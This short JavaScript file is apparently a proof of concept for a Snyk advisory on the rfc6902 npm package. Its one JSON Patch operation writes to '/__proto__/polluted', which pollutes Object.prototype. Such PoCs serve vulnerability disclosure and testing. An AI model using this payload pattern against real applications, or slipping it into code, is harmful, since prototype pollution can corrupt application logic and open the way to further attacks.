//https://security.snyk.io/vuln/SNYK-JS-RFC6902-1053318
 
   
  var rfc6902 = require("rfc6902");
  var obj = {};
  rfc6902.applyPatch(obj, [
    { op: "add", path: "/__proto__/polluted", value: "yes" },
  ]);
// End of file
